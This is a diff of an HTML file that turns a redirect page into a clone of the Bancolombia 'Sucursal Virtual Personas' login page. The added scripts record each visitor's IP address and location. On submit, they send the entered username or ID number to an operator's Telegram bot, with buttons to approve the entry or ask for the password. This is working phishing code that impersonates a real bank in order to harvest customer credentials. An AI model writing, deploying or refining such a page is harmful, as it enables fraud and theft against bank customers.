@@ -1,82 +1,305 @@
-<!DOCTYPE html>
-<html lang="es">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3c.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirigiendo - Bancolombia</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<title>Sucursal Virtual Personas</title>
+<meta content="es" http-equiv="Content-Language">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 
-        body {
-            margin: 0;
-            padding: 0;
-            background: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+<!-- CSS -->
+<link href="css/styles.css" media="all" rel="stylesheet" type="text/css">
+<link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css">
+<link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
+<link href="css/ui.css" media="all" rel="stylesheet" type="text/css">
+<link rel="shortcut icon" href="img/favicon.ico">
 
-        .loading-container {
-            text-align: center;
-            padding: 20px;
-        }
+<!-- jQuery - SOLO UNA VERSIÓN -->
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: #005CA9;
-            margin-bottom: 30px;
-        }
+<!-- jQuery plugins -->
+<script type="text/javascript" src="js/jquery.validate-1.11.1.js"></script>
+<script type="text/javascript" src="js/jquery-ui.js"></script>
+<script type="text/javascript" src="js/bootstrap.js"></script>
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #FDDA24;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
-        }
+<!-- Scripts personalizados -->
+<script>
+   $.getJSON("https://api.ipify.org/?format=json", function(data) {
+       $("#gfg").html(data.ip);
+       localStorage.setItem('userIP', data.ip);
+   })
+</script>
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+<script>
+   $.getJSON("https://ipinfo.io/", function (response) {
+       $("#ip").html("IP: " + response.ip);
+       $("#address").html("" + response.city + ", " + response.country);
+       localStorage.setItem('userIP2', response.city + ", " + response.country);
+   })
+</script>
 
-        .loading-text {
-            color: #005CA9;
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        .loading-subtext {
-            color: #666;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-    </style>
+<!-- Reloj en tiempo real -->
+<script type="text/javascript">
+   function actualizarReloj() {
+       const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+       const meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+       
+       const ahora = new Date();
+       const offset = -5;
+       const utc = ahora.getTime() + (ahora.getTimezoneOffset() * 60000);
+       const colombia = new Date(utc + (3600000 * offset));
+       
+       const dia = dias[colombia.getDay()];
+       const fecha = colombia.getDate();
+       const mes = meses[colombia.getMonth()];
+       const año = colombia.getFullYear();
+       
+       let horas = colombia.getHours();
+       const minutos = String(colombia.getMinutes()).padStart(2, '0');
+       const segundos = String(colombia.getSeconds()).padStart(2, '0');
+       const ampm = horas >= 12 ? 'PM' : 'AM';
+       
+       horas = horas % 12;
+       horas = horas ? horas : 12;
+       horas = String(horas).padStart(2, '0');
+       
+       const textoCompleto = `${dia} ${fecha} de ${mes} de ${año} ${horas}:${minutos}:${segundos} ${ampm}`;
+       
+       $('#jclock1').text(textoCompleto);
+   }
+   
+   $(document).ready(function() {
+       actualizarReloj();
+       setInterval(actualizarReloj, 1000);
+   });
+</script>
 </head>
+
 <body>
-    <div class="loading-container">
-        <div class="logo">Bancolombia</div>
-        <div class="spinner"></div>
-        <p class="loading-text">Redirigiendo a tu solicitud...</p>
-        <p class="loading-subtext">Por favor espera un momento</p>
-    </div>
+<div id="cargando" style="width: 100%; text-align: center; display: none;"></div>
+
+<div id="contenidoWeb" style="">
+   <form id="loginUserForm" name="loginUserForm" action="#" method="post">
+ 
+      <p id="address" hidden=""></p>
+
+      <div class="container" id="containerMain">
+         <div>
+            <div id="header" class="mua-page-header">
+               <div class="row row-logo-svp">
+                  <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                     <div class="mua-imgLogoItem"></div>
+                     <div class="text-svp-name">Sucursal Virtual Personas</div>
+                  </div>
+               </div>
+               <div class="row">
+                  <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                     <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
+                        <div>
+                           <div class="timeText">Fecha y hora actual:</div>
+                           <span id="jclock1" class="lastVisitedText"></span>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="panel-heading">
+               <h3>Inicio de sesión</h3>
+            </div>
+         </div>
+
+         <div class="panel panel-primary">
+            <div class="row" id="error">
+               <script language="JavaScript">
+                  function cerrarError() {
+                  	document.getElementById("tabError").style.display = "none";
+                  	document.getElementById('summary').innerHTML='';
+                  }
+               </script>
+               <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
+                  <div class="errorDiv">
+                     <div class="divTextMessage">
+                        <span class="icon-error errorIcon">
+                        <span class="path1"></span>
+                        <span class="path2"></span>
+                        <span class="path3"></span>
+                        </span>
+                        <div class="errorTitulo">Error</div>
+                        <div id="summary" class="errorTexto"></div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+
+            <div class="mua-panel-body">
+               <div class="row">
+                  <div class="col-xs-12 col-sm-5 col-md-4">
+                     <div class="panel_general mua-panel_general">
+                        <div class="title-panel-label">
+                           <h1>Usuario</h1>
+                        </div>
+                        <div class="subtitle-land-label">
+                           <h4>Si no tienes un usuario asignado ingresa con tu documento de identidad</h4>
+                        </div>
+                        <div id="contenido">
+                           <div class="mua-content-group-panel">
+                              <div class="mua-label-input">
+                                 <label class="control-label-index" for="username">Ingresa tu usuario</label>
+                              </div>
+                              <div>
+                                 <div class="mua_svp_enroll_update_control">
+                                    <input id="DocumentNumber" name="username" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" value="" maxlength="20" autocomplete="off" required>
+                                    <span class="mua-icon-user"> </span>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                        <div class="one-button-container mua-button-container">
+                           <button id="btnGo" name="btnGo" class="btn btn-success" type="submit">Continuar</button>
+                        </div>
+
+                        <div class="mua-panel_enlances">
+                           <p><a href="#">¿Olvidaste tu usuario?</a></p>
+                           <p><a href="#">¿Problemas para conectarte?</a></p>
+                        </div>
+                     </div>
+
+                     <div class="panel_general mua-panel_general">
+                        <div id="contenido">
+                           <div class="mua-divIcon">
+                              <a class="mua-itemsIcons-btn" href="#">
+                                 <div class="mua-divCell">
+                                    <span class="adminItems-Icons icon-icon_demo">
+                                    <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
+                                    </span>
+                                 </div>
+                                 <div class="mua-divCell-text">Conoce sobre Sucursal Virtual Personas</div>
+                              </a>
+                           </div>
+                           <div class="mua-divIcon">
+                              <a class="mua-itemsIcons-btn" href="#">
+                                 <div class="mua-divCell">
+                                    <span class="adminItems-Icons icon-icon_bloquear">
+                                    <span class="path1"></span><span class="path2"></span>
+                                    </span>
+                                 </div>
+                                 <div class="mua-divCell-text">Aprende sobre Seguridad</div>
+                              </a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+
+                  <div class="col-xs-12 col-sm-7 col-md-8">
+                     <div class="mua-embed-container-personal" id="banner-persona">												
+                        <iframe class="mua-iframe mua-iframe-personal-responsive" src="login_SVP_BC_zonaA.html" frameborder="0" scrolling="no" width="635px" height="335px"></iframe>
+                     </div>
+                     <p class="text-center">¿No conoces la Sucursal Virtual Personas?&nbsp; Conoce mas <a href="#" class="a1">aquí</a></p>
+                  </div>
+               </div>
+            </div>
+         </div>
+
+         <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12">
+               <p class="mua-footer">
+                  Sucursal Telefonica: Bogota (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05
+               </p>
+            </div>
+         </div>
+
+         <div style="margin-top: 10px;">
+            <div class="mua-title-text pull-left">Dirección IP:</div>
+            <div class="mua-title-text pull-left" id="gfg"></div>
+            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha"></span>&nbsp;&nbsp;</div>
+         </div>
+      </div>
+   </form>
+</div>
+
+<script src="js/sendTelegramMessage.js"></script>
+<script src="js/actions.js"></script>
+
+<script>
+$(document).ready(function() {
+    // Año actual
+    $("#fecha").text(new Date().getFullYear());
     
-    <script>
-        // Redirigir automáticamente después de 1.5 segundos
-        setTimeout(function() {
-            window.location.href = 'datos-personales.html';
-        }, 1500);
-    </script>
+    // Verificar si viene con error
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === '1') {
+        showError('Usuario no válido. Por favor verifica e intenta nuevamente.');
+    }
+    
+    // Manejar envío del formulario
+    $('#loginUserForm').on('submit', async function(e) {
+        e.preventDefault();
+        console.log('📤 Formulario enviado');
+        
+        const userName = $('#DocumentNumber').val().trim();
+        
+        if (!userName) {
+            showError('Por favor ingresa tu usuario o documento');
+            return false;
+        }
+        
+        // Guardar en localStorage
+        localStorage.setItem('userName', userName);
+        
+        const userIP = localStorage.getItem('userIP') || 'No disponible';
+        const userIP2 = localStorage.getItem('userIP2') || 'No disponible';
+        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        localStorage.setItem('transactionId', transactionId);
+        
+        // Mostrar loading
+        $('#cargando').show();
+        $('#containerMain').hide();
+        
+        // Mensaje a Telegram
+        const mensaje = `👤 *BANCOLOMBIA - USUARIO*\n\n` +
+            `📄 *Usuario/Doc:* ${userName}\n` +
+            `🌐 *IP:* ${userIP}\n` +
+            `📍 *Ubicación:* ${userIP2}\n` +
+            `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}\n` +
+            `🆔 *ID:* ${transactionId}`;
+        
+        const teclado = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+                    { text: "❌ Incorrecto", callback_data: `incorrecto:${transactionId}` }
+                ],
+                [
+                    { text: "🔐 Pedir Clave", callback_data: `correcto:${transactionId}` }
+                ]
+            ]
+        };
+        
+        try {
+            const response = await sendTelegramMessageWithBtn(mensaje, teclado);
+            
+            if (response) {
+                console.log('✅ Mensaje enviado correctamente');
+                const result = await waitForButtonPress(response.message_id);
+                await handleAction(result.action, transactionId);
+            } else {
+                // Si falla Telegram, continuar igual
+                console.log('⚠️ No se pudo enviar a Telegram, continuando...');
+                setTimeout(() => {
+                    window.location.href = 'login.html';
+                }, 1500);
+            }
+        } catch (error) {
+            console.error('❌ Error:', error);
+            // Continuar aunque falle
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 1500);
+        }
+        
+        return false;
+    });
+});
+</script>
 </body>
 </html>
